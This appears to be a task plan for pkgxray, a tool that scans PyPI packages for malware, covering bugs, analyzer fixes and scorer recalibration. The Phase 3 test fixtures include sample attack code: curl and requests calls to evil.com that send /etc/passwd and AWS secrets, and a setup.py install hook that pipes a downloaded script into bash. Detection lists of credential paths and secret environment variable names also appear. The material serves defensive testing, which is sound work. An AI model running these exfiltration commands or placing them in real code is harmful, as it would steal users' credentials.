# pkgxray — Instructions for Implementation

> **Purpose:** This file is the single source of truth for all remaining work on pkgxray v0.3.x. It contains the full project context, architecture, every known bug, every task to implement, and the acceptance criteria for each one. Use this file as your guide when working in Claude Code.

---

## Table of Contents

1. [Project Context](#1-project-context)
2. [Architecture & How It Works](#2-architecture--how-it-works)
3. [File-by-File Reference](#3-file-by-file-reference)
4. [Professor's Requirements — Status](#4-professors-requirements--status)
5. [Complete Bug Registry](#5-complete-bug-registry)
6. [Complete Task List](#6-complete-task-list)
   - Phase 1: Security Fixes (Bugs)
   - Phase 2: Analyzer Correctness (False Positives / False Negatives)
   - Phase 3: Scorer Recalibration
   - Phase 4: New Capabilities
   - Phase 5: Infrastructure & Docs
7. [Design Decisions (ADRs) to Maintain](#7-design-decisions-adrs-to-maintain)
8. [Assumptions the Library Relies On](#8-assumptions-the-library-relies-on)
9. [Known Evasion Techniques (Reference)](#9-known-evasion-techniques-reference)
10. [Test Strategy](#10-test-strategy)
11. [Definition of Done](#11-definition-of-done)

---

## 1. Project Context

**What pkgxray is:** A Python CLI tool and library that analyzes PyPI packages for suspicious/malicious behavior BEFORE installing them. It downloads the package archive, extracts the source code, and runs 8 AST-based analyzers to detect dangerous patterns.

**Repository:** https://github.com/maip-fred/pkgxray
**Current version:** 0.2.2
**Target version:** 0.3.0 (after all fixes)
**License:** MIT
**Python support:** 3.9+
**Dependencies:** `click>=8.0`, `rich>=13.0` (intentionally minimal for a security tool)
**Published on PyPI:** Yes

**Key design principles:**
- NEVER execute the analyzed package's code — only `ast.parse()` (safe syntax parsing)
- Use only `urllib` from stdlib for HTTP (no `requests` dependency — minimizes supply-chain risk)
- Fail-open per analyzer — a crash in one analyzer never aborts the scan
- Escalate severity to CRITICAL when dangerous calls are at module level (they run automatically on import)

---

## 2. Architecture & How It Works

```
User / CLI (cli.py)
    │
    ▼
scanner.scan(package_name, version)     ← single public entry-point
    │
    ├─► downloader.download_package()    ← GET PyPI JSON API + download archive
    │       │
    │       └─► extractor.extract_python_files()  ← open .tar.gz/.whl, yield ExtractedFile objects
    │               │
    │               └─► analyzers (×8)   ← each runs ast.parse() + ast.walk() per .py file
    │                       │
    │                       └─► scorer.calculate_risk_score()  ← weight + cap → 0-100
    │
    └─► ScanResult                       ← returned to caller
            │
            └─► reporter.generate_report()  ← terminal (rich) / JSON / HTML
```

**Pipeline steps in detail:**

1. **Download:** `downloader.py` calls `https://pypi.org/pypi/{name}/json`, picks the best distribution (prefers sdist > wheel), downloads to a temp dir.
2. **Extract:** `extractor.py` opens the archive, filters to `.py`/`setup.cfg`/`pyproject.toml` files, skips files >5MB and path traversal attempts, returns `ExtractedFile` objects with the source code as strings.
3. **Analyze:** For each file, each of the 8 analyzers calls `ast.parse()` on the source code, walks the AST looking for suspicious patterns, and returns `Finding` objects.
4. **Score:** `scorer.py` groups findings by analyzer, applies severity weights (LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15), caps each analyzer at 20 points max, caps total at 100.
5. **Report:** `reporter.py` formats the `ScanResult` as terminal output (with colors via `rich`), JSON, or HTML.

---

## 3. File-by-File Reference

### Core modules

| File | Purpose | Known Issues |
|------|---------|--------------|
| `src/pkgxray/__init__.py` | Public API: exports `scan`, `ScanResult`, `Finding`, `Severity`, `__version__` | Version hardcoded (but matches pyproject.toml) |
| `src/pkgxray/scanner.py` | Orchestrator — drives the full pipeline | `except Exception: continue` silences errors; no logging; no parallelism; no file count limit |
| `src/pkgxray/downloader.py` | PyPI HTTP client (urllib only) | User-Agent hardcoded as `pkgxray/0.1.0` (stale); no hash verification; no cache; no retry |
| `src/pkgxray/extractor.py` | Archive reader (.tar.gz/.whl/.zip) | Path traversal check bypassable; `setup.cfg`/`pyproject.toml` extracted but never analyzed; `ExtractedFile.is_setup` is dead code; `errors="ignore"` on decode silences corruption |
| `src/pkgxray/scorer.py` | Risk score calculator (0–100) | Over-sensitive: legit packages score HIGH/CRITICAL; no combo bonuses; arbitrary thresholds |
| `src/pkgxray/reporter.py` | Output formatters (terminal/JSON/HTML) | XSS vulnerability in HTML (description/filename not escaped); `Console(width=200)` hardcoded; `format` parameter shadows builtin; no SARIF support |
| `src/pkgxray/cli.py` | Click-based CLI | Version hardcoded as `0.1.0`; no `--fail-above`; no `--exclude`; no `--quiet`; no `scan-local` command |
| `src/pkgxray/utils.py` | Placeholder | Empty file (0 bytes) — dead code |

### Analyzer modules (all in `src/pkgxray/analyzers/`)

| File | Analyzer Name | Detects | Key Issues |
|------|--------------|---------|------------|
| `base.py` | (shared) | Severity, Finding, BaseAnalyzer, `is_module_level()`, `build_parent_map()` | `is_module_level()` wrongly returns False for class body code; `build_parent_map()` recalculated N times per file; `ScanResult` uses untyped `list`/`dict` |
| `__init__.py` | (registry) | `get_all_analyzers()` returns all 8 instances | Hardcoded list; no way to exclude analyzers |
| `code_exec.py` | `code_exec` | `eval()`, `exec()`, `compile()` | Only detects `ast.Name` (misses `builtins.eval()`); no alias detection; no argument analysis |
| `network.py` | `network` | HTTP calls, `urlopen`, `socket.connect` | Chained attributes missed (`self.session.get()`); `_KNOWN_HTTP_RECEIVERS` incomplete; no detection of direct imports (`from urllib.request import urlopen`) |
| `filesystem.py` | `filesystem` | Destructive calls + sensitive path strings | **`list.remove()` flagged as filesystem op** (no receiver filtering); no `is_module_level`; `_SENSITIVE_PATHS` incomplete; substring matching imprecise |
| `env_access.py` | `env_access` | `os.environ`, `os.getenv` | No `is_module_level`; `_SENSITIVE_ENV_KEYWORDS` too short; doesn't detect `environ.items()`/`environ.copy()`; doesn't detect `from os import environ` |
| `subprocess_calls.py` | `subprocess` | `subprocess.*`, `os.system/popen/execvp/execv` | Alias bypass (`import subprocess as sp`); missing `os.spawn*`, `os.execl*`, `pty.spawn()`; no argument analysis |
| `obfuscation.py` | `obfuscation` | `exec(b64decode(...))`, `codecs.decode(rot)`, `fromhex`, hex-escape strings | Only detects exact `exec(b64decode(...))` form; intermediate variable evades; no compression detection; no `marshal.loads`; no entropy analysis |
| `setup_scripts.py` | `setup_scripts` | Hooks in `setup.py`, dangerous imports/calls | Only analyzes files named `setup.py`; doesn't analyze `pyproject.toml` build hooks; missing base classes (`build_clib`, `bdist_wheel`) |
| `dynamic_imports.py` | `dynamic_imports` | `__import__()`, `importlib.import_module()` | **Receiver not verified** (any `obj.import_module()` flagged); `__import__("json")` is HIGH but should be lower; no `is_module_level`; missing `importlib.util.spec_from_file_location` |

### Test files

| File | Coverage |
|------|----------|
| `tests/conftest.py` | Shared fixtures: `SAFE_CODE`, `SUSPICIOUS_CODE`, `MALICIOUS_SETUP`, `CLEAN_SETUP` |
| `tests/test_analyzers/test_code_exec.py` | 8 tests: detect eval/exec/compile, module level vs function, safe code, syntax error |
| `tests/test_analyzers/test_network.py` | 10 tests: imports not flagged, requests.get detected, urlopen, socket.connect |
| `tests/test_analyzers/test_filesystem.py` | 9 tests: open not flagged, sensitive paths, os.remove, shutil.rmtree |
| `tests/test_analyzers/test_env_access.py` | 8 tests: os.environ subscript/get/getenv, sensitive variable escalation |
| `tests/test_analyzers/test_subprocess.py` | 8 tests: import not flagged, subprocess.run/Popen, os.system, module level |
| `tests/test_analyzers/test_obfuscation.py` | 6 tests: exec+b64decode, standalone b64decode not flagged, fromhex |
| `tests/test_analyzers/test_setup_scripts.py` | 6 tests: post-install hook, dangerous imports, clean setup, only-setup.py |
| `tests/test_analyzers/test_dynamic_imports.py` | 6 tests: __import__, importlib static/dynamic, safe code |
| `tests/test_downloader.py` | 5 tests: valid/invalid package, find distribution, download (hits network) |
| `tests/test_extractor.py` | 7 tests: tarball, zip, setup.py flagged, unsupported format, path traversal skipped |
| `tests/test_scanner.py` | 3 tests: scan known package (slow), result structure (slow), unknown package |

**Missing test coverage:** ~~No `test_scorer.py`, no `test_reporter.py`, no integration tests with expected score ranges~~ — created ✅. No evasion tests.

### Other files

| File | Purpose |
|------|---------|
| `pyproject.toml` | Build config (hatchling), dependencies, scripts entry point |
| `Dockerfile` | Python 3.11-slim, installs pkgxray + pytest |
| `docker-compose.yml` | 3 services: test, scan, scan-json |
| `.github/workflows/publish.yml` | CI: test on 3.9/3.11/3.12, publish to PyPI on tag |
| `notebooks/pkgxray_tutorial.ipynb` | Colab tutorial (27 cells) — demo notebook |
| `README.md` | Full README with badges, quickstart, architecture, comparisons |
| `CHANGELOG.md` | Version history from 0.1.0 to 0.2.2 |
| `LICENSE` | MIT license |

---

## 4. Professor's Requirements — Status

| # | Requirement | Status | What We Have | What's Missing |
|---|-------------|--------|-------------|----------------|
| 1 | **GitHub** | ✅ Done | Public repo, 17 commits, 3 releases, proper `.gitignore` | Nothing |
| 2 | **CI/CD** | ✅ Done | `publish.yml`: test matrix (3.9/3.11/3.12) + auto-publish to PyPI on tags | Could add coverage reporting badge |
| 3 | **Quantas doc (md/pdf)** | ✅ Done | `QUANTA.md` — covers every module, known issues, status per component | Update after fixes are applied |
| 4 | **ADRs** | ✅ Done | `ADR.md` — 7 ADRs with status, rationale, consequences | Add ADR-008 (binary analysis research) after C3 |
| 5 | **OpenAPI** | ⬜ N/A | pkgxray is a CLI/library, not a REST service | Does not apply — no action needed |
| 6 | **Infra** | ✅ Done | `Dockerfile` + `docker-compose.yml` (3 services) | Nothing |
| 7 | **README** | ✅ Done | Complete: badges, install, quickstart, architecture, comparisons, Docker | Update score reference table after B1 recalibration |
| 8 | **Demo** | ⚠️ Partial | Jupyter notebook on Colab (27 cells) | Add "Before vs After" section showing fixed false positives + malicious package detection |

**Action needed for the professor:** After implementing all fixes, update QUANTA.md (mark issues as fixed), ADR.md (add ADR-008, update ADR-004 with new calibration), README.md (update score reference table), and extend the notebook demo.

---

## 5. Complete Bug Registry

Every confirmed bug across both audits, ordered by severity.

### SECURITY BUGS

| ID | File | Bug | Impact | Fix |
|----|------|-----|--------|-----|
| BUG-01 | `reporter.py:159,163` | `f.description` and `f.filename` are NOT HTML-escaped in the HTML report. Only `code_snippet` is escaped. | **XSS vulnerability** — a malicious package with filename `<script>alert(1)</script>.py` would execute JS in the report | Use `html.escape()` on ALL user-controlled strings: `description`, `filename`, `code_snippet`, `analyzer_name` |
| BUG-02 | `extractor.py:53,96` | Path traversal check is `".." in member.name` — bypassable with paths like `foo/./../../etc/passwd` | **Zip-slip attack** — malicious archive could write outside the extraction directory | Replace with `os.path.normpath(name)` + check `startswith("..")` + check `os.path.isabs()` |

### CORRECTNESS BUGS

| ID | File | Bug | Impact | Fix |
|----|------|-----|--------|-----|
| BUG-03 | `base.py:28` | `is_module_level()` returns `False` for nodes inside a `ClassDef`. But class-body code (outside methods) DOES execute at import time. | Under-reports severity: `class Foo: subprocess.run(["curl", "http://evil.com"])` at import time is scored HIGH instead of CRITICAL | Remove `ast.ClassDef` from the check in `is_module_level()` — only `FunctionDef` and `AsyncFunctionDef` should return `False` |
| BUG-04 | `filesystem.py:50` | `.remove()` attribute check has NO receiver filtering. `my_list.remove(x)`, `my_set.remove(x)` are flagged as destructive filesystem calls. | False positive on every Python file that uses `list.remove()` or `set.remove()` | Only flag `.remove()` and `.unlink()` when receiver is `os`, `Path`, or `pathlib`. Keep `rmtree` unrestricted (unambiguous). |
| BUG-05 | `dynamic_imports.py:48` | `import_module` attribute is checked without verifying the receiver is `importlib`. Any `obj.import_module("x")` is flagged. | False positive if third-party objects have a method called `import_module` | Add receiver check: `func.value.id == "importlib"` |
| BUG-06 | `dynamic_imports.py:36-45` | `__import__("json")` with a static string literal is always HIGH. This is functionally equivalent to `import json`. | Unnecessary noise for legitimate code | Lower to MEDIUM or LOW when the argument is a string constant (same logic as `import_module`) |

### COSMETIC / CONSISTENCY BUGS

| ID | File | Bug | Fix |
|----|------|-----|-----|
| BUG-07 | `cli.py:14` | `@click.version_option(version="0.1.0")` — shows wrong version | Read from `pkgxray.__version__` dynamically |
| BUG-08 | `downloader.py:44` | `User-Agent: pkgxray/0.1.0` — stale | Read from `pkgxray.__version__` dynamically |
| BUG-09 | `extractor.py` + `base.py` | `ExtractedFile.is_setup` is set but never consumed | Either use it in `scanner.py` to replace the string check, or remove the field |
| BUG-10 | `utils.py` | Empty file (0 bytes) — dead code | Delete it, or populate with shared helpers (logging setup, etc.) |

### MISSING FEATURES (that affect correctness)

| ID | File | Issue | Impact |
|----|------|-------|--------|
| BUG-11 | `filesystem.py`, `env_access.py`, `dynamic_imports.py` | These 3 analyzers do NOT use `is_module_level()`. Dangerous calls at module level are NOT escalated to CRITICAL. | `shutil.rmtree("/tmp/x")` at module level → HIGH (should be CRITICAL); `os.getenv("SECRET")` at module level → HIGH (should be CRITICAL); `__import__("os")` at module level → HIGH (should be CRITICAL) |
| BUG-12 | `scanner.py:55-57` | `except Exception: continue` — no logging when an analyzer fails | Analyzer bugs are completely invisible in production. Impossible to debug. |

---

## 6. Complete Task List

Tasks are ordered by implementation phase. Within each phase, tasks are ordered by priority (do them in order).

---

### Phase 1: Security Fixes

These close actual vulnerabilities. Do these FIRST.

#### ✅ TASK-P1-01: Fix XSS in HTML reporter [DONE]
**File:** `src/pkgxray/reporter.py`
**Bug:** BUG-01
**Priority:** CRITICAL

**What to do:**
1. Add `import html` at the top of the file.
2. In `generate_html_report()`, escape ALL user-controlled strings before embedding them in HTML:
   ```python
   for f in result.findings:
       sev = f.severity.value
       bg = sev_colors.get(sev, "#ecf0f1")
       escaped_desc = html.escape(f.description)
       escaped_filename = html.escape(f.filename)
       escaped_snippet = html.escape(f.code_snippet[:120])
       escaped_analyzer = html.escape(f.analyzer_name)
       rows_html += f"""
       <tr style="border-bottom:1px solid #dee2e6;">
         <td style="padding:8px;font-weight:bold;color:{bg};">{sev.upper()}</td>
         <td style="padding:8px;">{escaped_analyzer}</td>
         <td style="padding:8px;font-size:0.85em;word-break:break-all;">{escaped_filename}</td>
         <td style="padding:8px;text-align:right;">{f.line_number}</td>
         <td style="padding:8px;">{escaped_desc}</td>
         <td style="padding:8px;font-family:monospace;font-size:0.8em;">{escaped_snippet}</td>
       </tr>"""
   ```
3. Also escape `result.package_name` and `result.version` in the header section (they come from PyPI and could theoretically be crafted).

**Acceptance criteria:**
- A finding with `filename="<script>alert(1)</script>.py"` renders as escaped text in the HTML, not as executable JavaScript.
- A finding with `description="test <b>bold</b> & 'quotes'"` renders as literal text.
- Existing HTML report still looks correct visually.

---

#### ✅ TASK-P1-02: Fix path traversal bypass in extractor [DONE]
**File:** `src/pkgxray/extractor.py`
**Bug:** BUG-02
**Priority:** CRITICAL

**What to do:**
1. Add `import os` at the top if not already present.
2. Replace the path traversal check in BOTH `_extract_from_tarball` and `_extract_from_zip`:

   **Before:**
   ```python
   if ".." in member.name:
       continue
   ```

   **After:**
   ```python
   normalized = os.path.normpath(member.name)
   if normalized.startswith("..") or os.path.isabs(normalized):
       continue
   ```

3. Apply the same fix in `_extract_from_zip` for `info.filename`.

**Acceptance criteria:**
- `"../../etc/passwd"` → skipped (already worked)
- `"foo/./../../etc/passwd"` → skipped (was NOT skipped before)
- `"/absolute/path/evil.py"` → skipped
- `"normal/package/module.py"` → extracted normally
- Update the existing test `test_path_traversal_skipped` to also cover the normpath bypass case.

---

### Phase 2: Analyzer Correctness

These fix false positives and false negatives.

#### ✅ TASK-P2-01: Fix `filesystem.py` — `list.remove()` false positive [DONE]
**File:** `src/pkgxray/analyzers/filesystem.py`
**Bug:** BUG-04
**Priority:** HIGH

**What to do:**
Only flag `.remove()` and `.unlink()` when the receiver is `os`, `pathlib`, or `Path`. Keep `rmtree` unrestricted since it's unambiguous.

```python
_RECEIVER_RESTRICTED_ATTRS = {"remove", "unlink"}  # need receiver check
_UNRESTRICTED_ATTRS = {"rmtree"}                    # always suspicious
_VALID_FS_RECEIVERS = {"os", "pathlib", "Path"}

# In the analysis loop:
if isinstance(node, ast.Call) and isinstance(func, ast.Attribute):
    if func.attr in _UNRESTRICTED_ATTRS:
        # Flag always (rmtree is unambiguous)
        ...
    elif func.attr in _RECEIVER_RESTRICTED_ATTRS:
        receiver = func.value.id if isinstance(func.value, ast.Name) else ""
        if receiver in _VALID_FS_RECEIVERS:
            # Flag only for filesystem receivers
            ...
```

**Acceptance criteria:**
- `my_list.remove(x)` → no finding
- `my_set.remove(x)` → no finding
- `os.remove(path)` → HIGH finding
- `Path("f").unlink()` → HIGH finding
- `shutil.rmtree(dir)` → HIGH finding (unchanged)
- Add tests in `tests/test_analyzers/test_filesystem.py`

---

#### ✅ TASK-P2-02: Fix `network.py` — chained attribute receiver not detected [DONE]
**File:** `src/pkgxray/analyzers/network.py`
**Bug:** Chained attribute false negative
**Priority:** HIGH

**What to do:**
Write a helper that extracts the deepest attribute name from an `ast.Attribute` chain:

```python
def _extract_receiver_name(node) -> str:
    """Extract the receiver name from a call's func.value.
    
    For simple names: requests.get() → "requests"
    For chained attrs: self.session.get() → "session"
    """
    if isinstance(node, ast.Name):
        return node.id
    elif isinstance(node, ast.Attribute):
        return node.attr
    return ""
```

Then replace every `func.value.id if isinstance(func.value, ast.Name) else ""` with `_extract_receiver_name(func.value)`.

**Acceptance criteria:**
- `self.session.get(url)` → HIGH finding (session is in `_KNOWN_HTTP_RECEIVERS`)
- `self.client.post(url)` → HIGH finding
- `self.db.connect()` → no finding (`db` is in `_DB_RECEIVERS_EXCLUDE`)
- `dict.get(key)` → no finding (dict not in known HTTP receivers)
- `requests.get(url)` → still works (unchanged)
- Add tests in `tests/test_analyzers/test_network.py`

---

#### ✅ TASK-P2-03: Fix `dynamic_imports.py` — receiver not verified + severity noise [DONE]
**File:** `src/pkgxray/analyzers/dynamic_imports.py`
**Bugs:** BUG-05, BUG-06
**Priority:** HIGH

**What to do:**
1. Add receiver check for `import_module`:
   ```python
   elif isinstance(func, ast.Attribute) and func.attr == "import_module":
       # Only flag when receiver is importlib
       if not (isinstance(func.value, ast.Name) and func.value.id == "importlib"):
           continue
       ...
   ```
2. Apply static/dynamic distinction to `__import__` (same as `import_module`):
   ```python
   if isinstance(func, ast.Name) and func.id == "__import__":
       if node.args and isinstance(node.args[0], ast.Constant):
           severity = Severity.MEDIUM  # __import__("json") — static, less dangerous
       else:
           severity = Severity.HIGH    # __import__(variable) — dynamic, dangerous
   ```

**Acceptance criteria:**
- `importlib.import_module("os")` → MEDIUM (was MEDIUM, now with receiver verified)
- `importlib.import_module(user_input)` → HIGH
- `some_obj.import_module("x")` → no finding (was incorrectly flagged before)
- `__import__("os")` → MEDIUM (was HIGH — static arg is less dangerous)
- `__import__(variable)` → HIGH (unchanged)
- Add tests in `tests/test_analyzers/test_dynamic_imports.py`

---

#### ✅ TASK-P2-04: Fix `base.py` — class body misclassified as not module-level [DONE]
**File:** `src/pkgxray/analyzers/base.py`
**Bug:** BUG-03
**Priority:** MEDIUM

**What to do:**
Modify `is_module_level()` to NOT stop at `ClassDef`:

```python
def is_module_level(node, parent_map: dict) -> bool:
    current_id = id(node)
    while current_id in parent_map:
        parent = parent_map[current_id]
        if isinstance(parent, (ast.FunctionDef, ast.AsyncFunctionDef)):
            return False
        # ClassDef is NOT a barrier — class body code runs at import time
        current_id = id(parent)
    return True
```

**Acceptance criteria:**
- `subprocess.run(["cmd"])` at module level → CRITICAL (unchanged)
- `def foo(): subprocess.run(["cmd"])` → not module level (unchanged)
- `class Foo: subprocess.run(["cmd"])` → CRITICAL (was incorrectly HIGH)
- `class Foo: def run(self): subprocess.run(["cmd"])` → not module level (unchanged)
- All existing tests still pass

---

#### ✅ TASK-P2-05: Add `is_module_level` to filesystem, env_access, dynamic_imports [DONE]
**Files:** `src/pkgxray/analyzers/filesystem.py`, `env_access.py`, `dynamic_imports.py`
**Bug:** BUG-11
**Priority:** MEDIUM

**What to do:**
These 3 analyzers currently do NOT call `build_parent_map()` or `is_module_level()`. Add the same pattern that `code_exec.py`, `network.py`, and `subprocess_calls.py` already use:

1. At the start of `analyze()`, after parsing the AST:
   ```python
   parent_map = build_parent_map(tree)
   ```
2. For each dangerous finding, check `is_module_level(node, parent_map)` and escalate:
   ```python
   at_module = is_module_level(node, parent_map)
   severity = Severity.CRITICAL if at_module else base_severity
   suffix = " — ejecutado al nivel del módulo, corre al importar" if at_module else ""
   ```

Apply to:
- **filesystem.py:** destructive calls (`remove`, `unlink`, `rmtree`)
- **env_access.py:** all env access patterns (but only escalate HIGH/MEDIUM findings — don't escalate LOW)
- **dynamic_imports.py:** both `__import__` and `importlib.import_module`

**Acceptance criteria:**
- `os.remove("/tmp/x")` at module level → CRITICAL (was HIGH)
- `os.getenv("SECRET")` at module level → CRITICAL (was HIGH)
- `os.getenv("HOME")` at module level → stays LOW (don't escalate LOW findings)
- `__import__("os")` at module level → CRITICAL
- Same calls inside functions → unchanged severity
- Add tests for each analyzer

---

#### ✅ TASK-P2-06: Expand sensitive paths and env keywords [DONE]
**Files:** `src/pkgxray/analyzers/filesystem.py`, `env_access.py`
**Priority:** MEDIUM

**What to do in filesystem.py — expand `_SENSITIVE_PATHS`:**
```python
_SENSITIVE_PATHS = {
    # System credentials
    "/etc/passwd": Severity.CRITICAL,
    "/etc/shadow": Severity.CRITICAL,
    # SSH keys
    "~/.ssh/": Severity.CRITICAL,
    "/.ssh/": Severity.CRITICAL,
    # Cloud credentials
    "~/.aws/": Severity.CRITICAL,
    "/.aws/": Severity.CRITICAL,
    "~/.kube/config": Severity.CRITICAL,
    "~/.docker/config.json": Severity.HIGH,
    "~/.config/gcloud/": Severity.HIGH,
    "~/.azure/": Severity.HIGH,
    # Package manager tokens
    "~/.npmrc": Severity.HIGH,
    "~/.pypirc": Severity.HIGH,
    "~/.git-credentials": Severity.HIGH,
    # GPG keys
    "~/.gnupg/": Severity.HIGH,
    # Shell configs (persistence vector)
    "~/.bashrc": Severity.HIGH,
    "~/.profile": Severity.HIGH,
    "~/.zshrc": Severity.HIGH,
    "~/.bash_profile": Severity.HIGH,
    # Temp (lower risk)
    "/tmp/": Severity.MEDIUM,
}
```

**What to do in env_access.py — expand `_SENSITIVE_ENV_KEYWORDS`:**
```python
_SENSITIVE_ENV_KEYWORDS = {
    # Cloud providers
    "AWS_SECRET", "AWS_ACCESS_KEY", "AZURE_", "GCP_", "DO_TOKEN",
    # Generic secrets
    "API_KEY", "TOKEN", "PASSWORD", "SECRET", "PRIVATE_KEY",
    # Database
    "DATABASE_URL", "MYSQL_PASSWORD", "POSTGRES_PASSWORD", "REDIS_PASSWORD", "MONGO_URI",
    # CI/CD & version control
    "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN", "BITBUCKET_TOKEN",
    # Messaging & services
    "SLACK_TOKEN", "SLACK_WEBHOOK", "TWILIO_SID", "STRIPE_KEY", "SENDGRID_API_KEY",
    # AI services
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
    # Auth
    "JWT_SECRET", "SESSION_SECRET", "COOKIE_SECRET",
}
```

**Acceptance criteria:**
- `os.getenv("GITHUB_TOKEN")` → HIGH (was LOW because keyword wasn't in the list)
- `path = "~/.kube/config"` → CRITICAL
- `path = "~/.npmrc"` → HIGH
- Existing tests still pass
- Add a few new tests for the expanded keywords/paths

---

### Phase 3: Scorer Recalibration

#### ✅ TASK-P3-01: Create synthetic test fixtures [DONE]
**Files:** New `tests/fixtures/` directory
**Priority:** HIGH (blocks P3-02)

**What to do:**
Create string fixtures that simulate specific attack patterns. These are Python source code strings, NOT real packages.

```python
# tests/fixtures/__init__.py

MALICIOUS_MODULE_LEVEL = '''
import subprocess
subprocess.Popen(["curl", "http://evil.com/steal", "-d", "@/etc/passwd"])
'''

MALICIOUS_OBFUSCATED = '''
import base64
exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
'''

MALICIOUS_ENV_EXFIL = '''
import os
import requests
secret = os.getenv("AWS_SECRET_ACCESS_KEY")
requests.post("http://evil.com/collect", data={"key": secret})
'''

MALICIOUS_SETUP_HOOK = '''
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        subprocess.call(["curl", "http://evil.com/steal.sh", "|", "bash"])
        install.run(self)

setup(name="evil", version="1.0", cmdclass={"install": CustomInstall})
'''

CLEAN_CLI_TOOL = '''
import os
import subprocess
import click

@click.command()
@click.argument("repo")
def clone(repo):
    home = os.getenv("HOME")
    subprocess.run(["git", "clone", repo, f"{home}/repos/{repo}"])
'''

CLEAN_HTTP_CLIENT = '''
import requests

def fetch_data(url):
    response = requests.get(url)
    return response.json()
'''

CLEAN_PURE_LIBRARY = '''
from dataclasses import dataclass
from typing import List

@dataclass
class Item:
    name: str
    value: float

def total(items: List[Item]) -> float:
    return sum(item.value for item in items)
'''
```

---

#### ✅ TASK-P3-02: Recalibrate the scorer [DONE]
**File:** `src/pkgxray/scorer.py`
**Priority:** HIGH

**What to do:**
1. First, implement all Phase 2 fixes (they affect what gets flagged).
2. Run `pkgxray scan` against these known-clean packages and record raw scores: `more-itertools`, `attrs`, `click`, `requests`, `paramiko`, `boto3`, `django`, `flask`, `sqlalchemy`, `pytest`.
3. Using those scores as a baseline, adjust:
   - Lower `MAX_SCORE_PER_ANALYZER` from 20 to something like 10-15
   - OR introduce per-analyzer caps (e.g. `env_access` capped at 8, `obfuscation` capped at 20)
   - Adjust thresholds if needed
4. Target scores after recalibration:
   - `more-itertools` → LOW
   - `attrs` → LOW
   - `click` → LOW or MODERATE
   - `requests` → MODERATE (not HIGH)
   - `paramiko` → HIGH at most (not CRITICAL)
   - Malicious fixtures from P3-01 → CRITICAL

5. **Add combo bonuses** for dangerous combinations:
   ```python
   DANGEROUS_COMBOS = {
       frozenset({"env_access", "network"}): 15,       # credential exfiltration
       frozenset({"network", "subprocess"}): 10,        # download + execute
       frozenset({"obfuscation", "code_exec"}): 20,     # obfuscated payload
       frozenset({"setup_scripts", "subprocess"}): 10,   # install hook + commands
   }
   
   def calculate_risk_score(findings):
       # ... existing capped sum logic ...
       
       # Combo bonuses
       active_analyzers = {f.analyzer_name for f in findings}
       for combo, bonus in DANGEROUS_COMBOS.items():
           if combo.issubset(active_analyzers):
               score += bonus
       
       return min(100, score), _level(score)
   ```

**Acceptance criteria:**
- All target scores hit (see list above)
- Malicious fixtures score CRITICAL
- Update `docs/ADR.md` ADR-004 with new values and the empirical baseline
- Update `README.md` score reference table

---

#### ✅ TASK-P3-03: Integration tests with expected score ranges [DONE]
**File:** New `tests/test_integration.py`
**Priority:** HIGH

**What to do:**
Write tests that feed the fixtures through the full analysis pipeline (without downloading from PyPI) and assert on score ranges.

```python
import pytest
from pkgxray.analyzers import get_all_analyzers
from pkgxray.scorer import calculate_risk_score

def _analyze_code(source_code, filename="test.py"):
    """Run all analyzers on source code and return (score, level, findings)."""
    analyzers = get_all_analyzers()
    all_findings = []
    for analyzer in analyzers:
        findings = analyzer.analyze(source_code, filename)
        all_findings.extend(findings)
    score, level = calculate_risk_score(all_findings)
    return score, level, all_findings

class TestMaliciousFixtures:
    def test_module_level_subprocess(self):
        score, level, _ = _analyze_code(MALICIOUS_MODULE_LEVEL)
        assert level in ("HIGH", "CRITICAL")
    
    def test_obfuscated_exec(self):
        score, level, _ = _analyze_code(MALICIOUS_OBFUSCATED)
        assert level in ("HIGH", "CRITICAL")
    
    def test_setup_hook(self):
        score, level, _ = _analyze_code(MALICIOUS_SETUP_HOOK, "setup.py")
        assert level == "CRITICAL"

class TestCleanFixtures:
    def test_pure_library(self):
        score, level, _ = _analyze_code(CLEAN_PURE_LIBRARY)
        assert level == "LOW"
    
    def test_cli_tool(self):
        score, level, _ = _analyze_code(CLEAN_CLI_TOOL)
        assert level in ("LOW", "MODERATE")
```

**Acceptance criteria:**
- All malicious fixtures → HIGH or CRITICAL
- All clean fixtures → LOW or MODERATE
- Tests run WITHOUT network access (no PyPI download)
- Mark with `@pytest.mark.integration`

---

### Phase 4: New Capabilities

#### ✅ TASK-P4-01: Add `--fail-above` CLI option [DONE]
**File:** `src/pkgxray/cli.py`
**Priority:** MEDIUM

**What to do:**
```python
@main.command(name="scan")
@click.argument("package_name")
@click.option("--version", "-v", default=None, help="Versión específica del paquete a analizar")
@click.option("--format", "-f", "output_format", type=click.Choice(["terminal", "json", "html"]), default="terminal")
@click.option("--output", "-o", default=None, help="Guardar el reporte en un archivo")
@click.option("--fail-above", type=int, default=None, help="Salir con código 1 si el score >= este valor (para CI/CD)")
def scan_cmd(package_name, version, output_format, output, fail_above):
    try:
        console.print(f"\n[bold]Analizando [cyan]{package_name}[/cyan]...[/bold]\n")
        result = scan(package_name, version)
        generate_report(result, format=output_format, output_path=output)
        if output:
            console.print(f"\n[bold]Reporte guardado en [green]{output}[/green][/bold]")
        if fail_above is not None and result.risk_score >= fail_above:
            console.print(f"\n[red]Score {result.risk_score} >= umbral {fail_above} — saliendo con error[/red]")
            raise SystemExit(1)
    except PackageNotFoundError:
        ...
```

**Acceptance criteria:**
- `pkgxray scan requests --fail-above 90` → exits 0 (score is below 90)
- `pkgxray scan requests --fail-above 10` → exits 1 (score is above 10)
- Without `--fail-above` → exits 0 as before

---

#### ✅ TASK-P4-02: Add TOML parsing for `pyproject.toml` [DONE]
**Files:** `src/pkgxray/extractor.py`, new `src/pkgxray/analyzers/config_files.py`
**Priority:** MEDIUM

**What to do:**
1. In `extractor.py`, detect config files and set a flag:
   ```python
   @dataclass
   class ExtractedFile:
       filename: str
       content: str
       is_setup: bool = False
       is_config: bool = False  # NEW — for pyproject.toml, setup.cfg
   ```

2. Create `analyzers/config_files.py`:
   ```python
   """Analyzer for pyproject.toml and setup.cfg configuration files."""
   
   import sys
   if sys.version_info >= (3, 11):
       import tomllib
   else:
       try:
           import tomli as tomllib
       except ImportError:
           tomllib = None
   
   import configparser
   from pkgxray.analyzers.base import BaseAnalyzer, Finding, Severity
   
   class ConfigFileAnalyzer(BaseAnalyzer):
       name = "config_files"
